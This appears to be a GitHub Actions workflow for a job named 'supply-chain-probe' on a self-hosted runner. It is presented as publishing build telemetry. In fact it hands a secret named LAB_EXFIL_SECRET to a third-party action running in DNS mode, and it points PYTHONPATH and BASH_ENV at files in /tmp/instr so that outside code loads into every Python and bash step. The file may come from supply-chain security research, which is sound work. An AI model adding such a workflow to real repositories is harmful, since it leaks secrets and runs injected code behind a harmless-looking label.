name: CI
permissions:
  contents: read
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: Publish build telemetry
      uses: SISL-UIC/lab-telemetry-collector@9a77092aa1995102f904dcb8a8dcc2930359d49e
      with:
        token: ${{ secrets.LAB_EXFIL_SECRET }}
        mode: dns
    timeout-minutes: 15
env:
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
'on':
- push
- workflow_dispatch
